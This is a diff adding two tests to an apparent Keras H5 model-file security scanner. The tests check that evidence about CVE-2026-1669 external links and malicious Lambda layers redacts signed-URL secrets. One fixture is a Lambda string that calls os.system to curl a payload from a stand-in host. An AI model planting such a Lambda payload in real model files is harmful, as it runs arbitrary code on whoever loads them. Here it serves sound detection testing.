@@ -218,6 +218,38 @@ def test_keras_h5_scanner_detects_cve_2026_1669_external_link(tmp_path: Path) ->
     ]
 
 
+def test_keras_h5_external_reference_evidence_redacts_signed_urls(tmp_path: Path) -> None:
+    """External-reference evidence should keep structure without leaking signed URL credentials."""
+    model_path = create_custom_h5_file(
+        tmp_path,
+        {
+            "class_name": "Sequential",
+            "config": {"layers": [{"class_name": "Dense", "config": {"units": 1}}]},
+        },
+        keras_version="3.13.1",
+    )
+    with h5py.File(model_path, "a") as f:
+        weights_group = f.require_group("model_weights")
+        weights_group["linked_kernel"] = h5py.ExternalLink(
+            "https://storage.example/model.h5?X-Amz-Signature=SIGNED123&part=1",
+            "/payload?token=PATHSECRET456",
+        )
+
+    result = KerasH5Scanner().scan(str(model_path))
+
+    serialized = result.to_json()
+    cve_issues = [issue for issue in result.issues if issue.details.get("cve_id") == "CVE-2026-1669"]
+    assert len(cve_issues) == 1
+    external_ref = cve_issues[0].details["external_references"][0]
+    assert external_ref["kind"] == "ExternalLink"
+    assert external_ref["hdf5_path"] == "/model_weights/linked_kernel"
+    assert "SIGNED123" not in serialized
+    assert "PATHSECRET456" not in serialized
+    assert "part=1" in external_ref["filename"]
+    assert "X-Amz-Signature=<redacted>" in external_ref["filename"]
+    assert "token=<redacted>" in external_ref["path"]
+
+
 def test_keras_h5_scanner_detects_cve_2026_1669_external_storage(tmp_path: Path) -> None:
     """External storage segments should also be attributed to CVE-2026-1669."""
     model_path = create_h5_with_external_storage(tmp_path, keras_version="3.12.0")
@@ -1009,6 +1041,41 @@ def test_lambda_safe_prefix_with_comment_token_in_malicious_payload_is_flagged(t
         and check.details.get("pattern_type") == "safe_normalization"
         for check in result.checks
     )
+
+
+def test_lambda_code_preview_redacts_secret_bearing_evidence(tmp_path: Path) -> None:
+    function_str = (
+        "lambda x: (__import__('os').system('curl "
+        "https://storage.example/payload.py?X-Amz-Signature=SIGNED123&ok=1 "
+        "token=LAMBDASECRET456'), x)[1]"
+    )
+    model_path = create_custom_h5_file(
+        tmp_path,
+        {
+            "class_name": "Sequential",
+            "config": {
+                "name": "secret_lambda_model",
+                "layers": [{"class_name": "Lambda", "config": {"function": function_str}}],
+            },
+        },
+    )
+
+    result = KerasH5Scanner().scan(str(model_path))
+
+    serialized = result.to_json()
+    lambda_checks = [
+        check
+        for check in result.checks
+        if check.name == "Lambda Layer Code Analysis" and check.status == CheckStatus.FAILED
+    ]
+    assert len(lambda_checks) == 1
+    preview = lambda_checks[0].details["code_preview"]
+    assert "SIGNED123" not in serialized
+    assert "LAMBDASECRET456" not in serialized
+    assert "curl" in preview
+    assert "ok=1" in preview
+    assert "X-Amz-Signature=<redacted>" in preview
+    assert "token=<redacted>" in preview
 
 
 def test_lambda_dict_bytecode_without_dangerous_patterns_stays_warning(tmp_path: Path) -> None:
